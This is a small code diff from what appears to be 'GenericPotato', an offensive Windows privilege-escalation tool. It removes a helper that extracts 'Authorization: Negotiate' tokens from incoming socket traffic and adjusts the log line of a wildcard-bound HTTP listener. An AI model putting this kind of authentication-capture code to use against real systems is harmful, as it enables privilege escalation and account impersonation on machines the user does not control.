@@ -99,27 +99,10 @@ namespace GenericPotato {
             spoolPipe.Close();
         }
 
-        string GetAuthorizationHeader(Socket socket)
-        {
-
-            byte[] buffer = new byte[8192];
-            socket.Receive(buffer);
-            string authRequest = Encoding.ASCII.GetString(buffer);
-            Regex rx = new Regex(@"Authorization: Negotiate (?<neg>.*)");
-            MatchCollection matches = rx.Matches(authRequest);
-
-            if (matches.Count == 0)
-            {
-                return null;
-            }
-
-            return matches[0].Groups["neg"].Value;
-        }
-
         void HTTPListener()
         {
 
-            Console.WriteLine($"[+] Starting HTTP listener on port {port}");
+            Console.WriteLine($"[+] Starting HTTP listener on port http://*:{port}");
             HttpListener listener = new HttpListener();
             listener.Prefixes.Add($"http://*:{port}/");
             listener.Start();
